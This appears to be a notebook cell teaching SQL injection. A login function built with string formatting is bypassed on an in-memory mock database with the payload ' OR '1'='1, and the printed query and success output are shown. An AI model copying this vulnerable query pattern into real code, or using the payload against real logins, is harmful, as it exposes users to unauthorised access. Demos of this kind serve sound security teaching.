In [1]:
import sqlite3

def setup_mock_database():
    # Create an in-memory database (disappears when the script ends)
    conn = sqlite3.connect(':memory:')
    cursor = conn.cursor()
    
    # Create a Users table
    cursor.execute("CREATE TABLE users (id INTEGER, username TEXT, password TEXT)")
    
    # Insert the Admin user
    cursor.execute("INSERT INTO users VALUES (1, 'admin', 'SuperSecretPass123!')")
    conn.commit()
    return conn

def vulnerable_login(conn, username, password):
    cursor = conn.cursor()
    
    # THE VULNERABILITY: String Concatenation!
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    print(f"Executing Query: {query}")
    
    cursor.execute(query)
    user = cursor.fetchone()
    
    if user:
        print("[+] LOGIN SUCCESSFUL! Welcome,", user[1])
    else:
        print("[-] LOGIN FAILED. Invalid credentials.")

# 1. Setup the Database
db_connection = setup_mock_database()

# 2. Normal Login (Fails because we don't know the password)
print("\n--- TEST 1: NORMAL FAILED LOGIN ---")
vulnerable_login(db_connection, "admin", "WrongPassword")

# 3. SQL INJECTION HACK (The Magic String: ' OR '1'='1 )
print("\n--- TEST 2: SQL INJECTION ATTACK ---")
# By passing ' OR '1'='1 as the password, we manipulate the WHERE clause to always be TRUE
hack_password = "' OR '1'='1"
vulnerable_login(db_connection, "admin", hack_password)


--- TEST 1: NORMAL FAILED LOGIN ---
Executing Query: SELECT * FROM users WHERE username = 'admin' AND password = 'WrongPassword'
[-] LOGIN FAILED. Invalid credentials.

--- TEST 2: SQL INJECTION ATTACK ---
Executing Query: SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
[+] LOGIN SUCCESSFUL! Welcome, admin
